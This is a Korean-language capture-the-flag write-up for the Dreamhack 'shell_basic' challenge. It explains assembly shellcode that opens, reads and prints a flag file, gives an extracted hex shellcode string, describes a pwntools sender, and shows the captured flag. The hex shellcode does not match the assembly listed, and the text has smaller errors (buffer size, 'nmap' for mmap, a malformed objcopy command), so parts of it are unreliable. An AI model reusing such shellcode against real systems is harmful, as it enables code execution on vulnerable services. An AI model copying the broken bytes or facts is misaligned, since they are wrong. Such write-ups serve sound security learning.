<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "shell_basic"  Write-UP</h1>
</body>
<br>
<br>
</html>

2024.11.12 풀이

![image](https://github.com/user-attachments/assets/b2354a38-5a4a-4d27-960c-c03eaf700cee)

문제 설명을 보면, flag를 출력하는 쉘 코드를 작성해야 할 것으로 보인다. 
다른 부분은 보지 않고, main 함수 부분만 살펴보면 될 것 같아 보인다. 
flag의 위치는 /home/shell_basic/flag_name_is_loooooong 에 있는 것으로 보인다. 

<br>

</br> 

일단 문제 파일부터 살펴보려고 한다.

![image](https://github.com/user-attachments/assets/6d720fa9-2c2e-44a1-83ef-6855580fcecf)

![image](https://github.com/user-attachments/assets/6469b0ba-052a-4bd9-ba95-e7c4f45d78e1)

위와 같은 C 파일이 있는데, 문제 설명에서 main 함수 부분만 살펴보라고 하였으니, main 함수 부분만 살펴보려고 한다.

int argc는 프로그램 실행 시, 전달되는 인자 개수를 말하는 것으로 보이고, 뒤에 char *argc[]는 각 인자의 문자열 배열을 가리키는 것으로 보인다.

`char *shellcode = mmap(...)` 에서 nmap은 새로운 메모리 영역을 할당하는 함수라고 한다. 또한, NULL은 시스템이 적절한 주소를 선택하도록 하는 것으로 보인다.
여기서 할당된 메모리의 크기는 0x1000이며, `PROT_READ | PROT_WRITE | PROT_EXEC` 부분을 통해, 메모리 영역에 읽기, 쓰기, 실행 권한을 부여하는 것 또한 살펴볼 수 있다.
`MAP_PRIVATE | MAP_ANONYMOUS` 을 보니, 익명의 메모리 매핑으로 파일이 아닌 메모리 공간을 할당할 것으로 보인다. 
그 후, 사용자에게 쉘 코드를 입력받고, 이의 시작 주소를 함수 포인터 sc에 할당하는 것으로 보이며, 쉘 코드를 실행할 것으로 보인다. 

즉, 현재 main 부분만 보았을 때는, 사용자로부터 입력된 데이터인 쉘 코를 읽어 실행 권한이 있는 메모리 영역에 저장하고, 그 메모리를 실행하는 것으로 보인다. 

<br>

</br> 

일단 /home/shell_basic/flag_name_is_loooooong 에서 flag 데이터 값을 불러와서, 저장 후에 화면에 출력하게끔 하는 코드를 작성하면 되지 않을까 생각하여 코드를 임의로 작성해보았다. 

<br>

</br> 

```
char buf[30];

int f = open("/home/shell_basic/flag_name_is_loooooong");

read(f, buf, 0x30);
write(1, buf, 0x30);
```
작성한 코드인데, 살펴보면, char buf[30]; 을 통해 30바이트 크기의 문자 배열 buf를 선언하고,

int f = open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL); 는 
파일을 읽기 전용으로 열고, 이를 그 파일의 파일 디스크립터를 f에 저장하도록 하는 코드이다. 

    "디스크립터"란 OS가 프로그램과 파일, 네트워크 소켓 등과 같은 자원 사이를 연결해주는 고유한 식별자를 말한다고 한다. 
    파일 디스크립터는 특히 파일이나 입출력 스트림과 같은 자원을 참조할 때 사용하는 정수 값이라고 한다. 

<br>

</br> 
또한, read를 통해 파일 디스크립터 f로부터 최대 48바이트를 읽어 buf에 저장하고, write를 통해, buf의 내용을 48바이트만큼 출력하도록 작성해보았다. 

<br>

</br> 

![image](https://github.com/user-attachments/assets/7b398159-8934-4532-b6ac-227e3c6df14d)

하지만, 위 코드의 내용을 그대로 사용하면 안 되고, 어셈블리어로 변환해서 사용해야 되기 때문에, 이를 변환해보려고 한다.
한 번도 작성해본 적이 없어서 어떤 식으로 적어야 할지 감이 안 잡혀서 드림핵에 있는 예제 코드를 활용하여 작성해보려고 한다.

<br>

</br> 

```
section .text
global _start

_start:
    ; Push the file path "/home/shell_basic/flag_name_is_loooooong" onto the stack (역순으로).
    push 0x0                     ; NULL 바이트
    mov rax, 0x676e6f6f6f6f6f6f  ; "oooooong"
    push rax
    mov rax, 0x6c5f73695f656d61  ; "ame_is_l"
    push rax
    mov rax, 0x6e5f67616c662f63  ; "c/flag_n"
    push rax
    mov rax, 0x697361625f6c6c65  ; "ell_basi"
    push rax
    mov rax, 0x68732f656d6f682f  ; "/home/sh"
    push rax

    ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY)
    mov rdi, rsp                 ; 파일 경로 주소 (첫 번째 인자)
    xor rsi, rsi                 ; RD_ONLY (두 번째 인자)
    xor rdx, rdx                 ; NULL (세 번째 인자)
    mov rax, 2                   ; open() 시스템 콜 번호
    syscall                      ; open() 호출

    ; rax에 있는 파일 디스크립터를 rdi로 이동 (read()의 첫 번째 인자)
    mov rdi, rax
    ; 버퍼 주소 설정 (rsp - 0x30, 48바이트를 확보)
    sub rsp, 0x30
    mov rsi, rsp                 ; 버퍼 주소 (두 번째 인자)
    mov rdx, 0x30                ; 읽을 바이트 수 (세 번째 인자)
    mov rax, 0                   ; read() 시스템 콜 번호
    syscall                      ; read() 호출

    ; write(1, buf, 0x30)
    mov rdi, 1                   ; stdout (첫 번째 인자)
    mov rax, 1                   ; write() 시스템 콜 번호
    syscall                      ; write() 호출

    ; 프로그램 종료
    xor rdi, rdi                 ; exit(0) (첫 번째 인자)
    mov rax, 0x3c                ; exit() 시스템 콜 번호
    syscall                      ; exit() 호출

```

위와 같은 형식으로 작성해보았다.
<br>

</br>

## push 코드 설명

![image](https://github.com/user-attachments/assets/3f026b90-c4f6-41ee-96b6-a86086130b2b)

1. `push 0X0`
   
  : 문자열의 끝을 나타내는 NULL 바이트를 스택에 푸시하는 부분이라고 한다. 이는 문자열의 끝을 알리기 위해 필요하다고 한다.

2. `mov rax, 0x676e6f6f6f6f6f6f`

  : 레지스터 rax에 flag가 저장된 주소 문자열의 일부인 "oooooong" 을 저장하는 부분이다. 이 문자열은 8바이트로 표현되며, 스택에 푸시될 때 역순으로 저장된다고 한다.

3. `push rax`
   
  : rax에 저장된 "oooooong" 을 스택에 푸시하여 저장하는 부분이다.

4. `mov rax, 0x6c5f73695f656d61`
   
  : 문자열 "ame_is_l"을 rax에 저장하는 부분이다.

5. `push rax`
   
  : rax에 저장된 "ame_is_l"을 스택에 푸시한다,

6. `mov rax, 0x6e5f67616c662f63`
   
  : 문자열 "c/flag_n"을 rax에 저장한다,

7. `push rax`
   
  : rax에 저장된 "c/flag_n"을 스택에 푸시한다.

8. `mov rax, 0x697361625f6c6c65`
   
  : 문자열 "ell_basi"를 rax에 저장한다.

9. `push rax`
    
  : rax에 저장된 "ell_basi"를 스택에 푸시한다,

10. `mov rax, 0x68732f656d6f682f`
    
  : 문자열 "/home/sh"을 rax에 저장한다.

11. `push rax`
    
  : rax에 저장된 "/home/sh"을 스택에 푸시한다.

<br>

</br>

이 부분의 코드는 스택에 파일 경로 /home/shell_basic/flag_name_is_loooooong을 푸시한 결과를 만드는 부분이다.

스택에서 데이터를 읽을 떄는 가장 마지막에 푸시된 데이터부터 읽기 때문에 경로는 올바른 순서로 메모리에 저장된다.

*역순으로 푸시하는 이유 : 스택의 LIFO 특성 때문에, 문자열을 스택에 역순으로 푸시해야 메모리 내에서 문자열이 올바른 순서로 저장됨.

<br>

</br>

## open 코드 설명

![image](https://github.com/user-attachments/assets/8753d397-83a1-4ac7-8c44-71250ec43cda)

1. `mov rdi, rsp`
   
  : 파일 경로의 시작 주소를 rdi 레지스터에 저장한다.
  
  +) rsp는 스택 포인터를 가리키므로, 앞서 스택에 푸시된 파일 경로의 시작 주소가 rdi에 설정됨
    
  +) rdi는 open() 시스템 콜의 첫 번째 인자로, 파일 경로로 전달함

2. `xor rsi, rsi`

   : rsi를 0으로 설정함. xor 명령어를 사용하여 더 빠르게 0으로 설정 가능

   +) rsi는 open()의 두 번째 인자로, RD_ONLY (읽기 전용 모드)를 나타냄
   
3. `xor rdx, rdx`

   : rdx를 0으로 설정

   +) rdx는 open() 세 번째 인자로, 파일을 생성할 때의 모드를 나타냄.

4. `mov rax, 2`

   : rax에 2를 저장함

   +) rax는 시스템 콜 번호를 지정하는 레지스터 -> 2가 들어가면 open() 시스템 콜 호출

5. `syscall`

   : 시스템 콜을 호출하는 명령어

   +) open() 시스템 콜이 실행되고, 반환값이 rax에 저장됨

     -> 호출이 성공하면, 열린 파일의 파일 디스크립터가 반환됨

<br>

</br>

즉, 이 부분은 open() 시스템 콜을 호출하여 파일을 여는 부분이다. 어셈블리 코드에서는 시스템 콜의 인자를 레지스터에 설정하고, 시스템 콜 번호를 rax에 설정한 후 syscall 명령어를 통해 호출한다고 한다. 
파일이 성공으로 열리면, 파일 디스크립터는 rax에 반환되며, 이후 다른 시스템 콜에서 이 파일 디스크립터를 사용하여 파일을 읽거나 조작할 수 있다.

<br>

</br>

## read 코드 설명

![image](https://github.com/user-attachments/assets/d4059bfe-3376-4a6b-b701-c0f8408235cb)

1. `mov rdi, rax`

   : open() 시스템 콜의 반환값(파일 디스크립터)이 rax에 저장되어 있다.

   +) read() 시스템 콜의 첫 번째 인자는 읽어올 파일의 디스크립터를 지정해야 하므로, 이 값을 rdi로 이동하여 설정

2. `sub rsp, 0x30`

   : 스택 포인터 rsp를 48바이트(0x30)만큼 감소시켜 버퍼 공간을 확보한다.

   -> 이 과정은 스택에 메모리 공간을 마련하여 read()가 데이터를 읽어와 저장할 공간을 만듦

3. `mov rsi, rsp`

   : rsi에 rsp 값을 저장하여 read() 시스템 콜의 두 번째 인자로 버퍼의 주소를 설정한다.

    ->  버퍼는 앞서 sub rsp, 0x30을 통해 확보된 스택 공간을 가리킴

4. `mov rdx, 0x30`

   : rdx에 0x30(48)을 저장하여 read() 시스템 콜의 세 번째 인자로 읽을 바이트 수를 설정한다.

    -> 이 코드는 파일에서 최대 48바이트를 읽음

5. `mov rax, 0`

   : rax에 0을 저장하여 read() 시스템 콜 번호를 설정한다.

6. `syscall`

   : read() 시스템 콜을 호출한다

   -> 호출 성공시, 읽은 바이트 수가 rax에 저장되고, rsp가 가리키는 버퍼에 파일 데이터가 저장됨.

<br>

</br>

즉, 이 부분은 열린 파일의 내용을 읽고, 데이터를 버퍼에 저장하는 과정을 수행한다. 
열린 파일로부터 최대 48바이트를 읽어 스택의 버퍼에 저장한다. 
이 과정은 파일의 내용을 메모리로 읽어 들여 프로그램이 후속 작업을 할 수 있게 준비하는 단계이다.

<br>

</br>

## write, exit 부분

![image](https://github.com/user-attachments/assets/7b6a4ad2-70f6-4bff-8bf7-f1775e234d69)

1. `mov rdi, 1`
   
   : rdi에 1을 저장하여 write() 시스템 콜의 첫 번째 인자로 설정한다,

2. `mov rax, 1`

   : rax에 1을 저장하여 write() 시스템 콜 번호를 설정한다.

3. `syscall`

   : write() 시스템 콜을 호출하여 rsi에 설정된 버퍼 내용을 표준 출력으로 출력한다.

   -> rdi는 출력 대상(여기서는 1, 즉 stdout), rsi는 버퍼의 주소, rdx는 출력할 바이트 수

<br>

</br>

1. `xor rdi, rdi`
   
   : rdi를 0으로 설정한다.

2. `mov rax, 0x3c`

   : rax에 0x3c 를 저장하여 exit() 시스템 콜 번호를 설정한다,

3. `syscall`

   : exit() 시스템 콜을 호출하여 프로그램을 종료한다.

<br>

</br>

즉, 이 부분들은 write() 시스템 콜을 호출하여 표준 출력으로 버퍼 내용을 출력하고, 프로그램을 종료하는 exit() 시스템 콜을 호출하는 과정이다. 
<br>

</br>
<br>

</br>

이제 이를 쉘 코드로 추출하기 위해, 컴파일 / 링크를 하고 추출해보려고 한다. 

![image](https://github.com/user-attachments/assets/441c0ac0-4b4e-4f86-8e8a-73c0c1cfa174)

`nasm -f elf64 shell_basic.asm ` 명령어를 통해, 컴파일 및 링크를 하여, object 파일을 만든다.

<br>

</br>

![image](https://github.com/user-attachments/assets/54003647-1297-4812-a44a-3a27b6cbf926)
![image](https://github.com/user-attachments/assets/af6562db-775d-4c61-8c29-1cbd1487b5f2)

`objcopy --dump-section .text-shell_basic.bin shell_basic.o` 명령어를 통해, 바이너리로 변환한다.

또한, `xxd shell_basic.bin` 명령어를 통해, 바이너리를 헥사코드로 변환한다.
출력된 hex 값들을 잘 정리해주어 쉘 코드를 추출해보면,
<br>

</br>

```
\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\xb0\x3d\x12\xb8\x02\x00\x00\x0f\x05\x48\xc7\x48\x31\xec\x30\x48\xb9\xe8\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x00\x0f\x05
```
이와 같다. 

<br>

</br>
<br>

</br>

![image](https://github.com/user-attachments/assets/6d940ca9-1b47-4330-9b70-bf5d42002312)

이제 위에서 얻은 쉘 코드를 pwntools를 써서 서버로 보내보려고 한다.
그래서, 위와 같은 파이썬 코드를 작성해보았다. 
코드가 지정된 호스트와 포트와 연결을 시도하고, 'shell code: ' 문자열을 서버에서 받을 때까지 대기하는 코드이다.
그 후, 준비된 쉘 코드를 서버에 전송하고, 상호작용 모드로 전환하여 서버의 응답을 실시간으로 확인하고 상호작용할 수 있게 해주는 코드이다. 

<br>

</br>

![image](https://github.com/user-attachments/assets/35952979-cdc5-43e2-b0b5-9831294d5ece)

위 파이썬 파일을 실행해보니, 플래그가 출력되었다!!!!

<br>

</br>

```
DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
```

<br>

</br>

![image](https://github.com/user-attachments/assets/4e024068-ea4a-4bb0-8f9c-ea55700c1cb1)

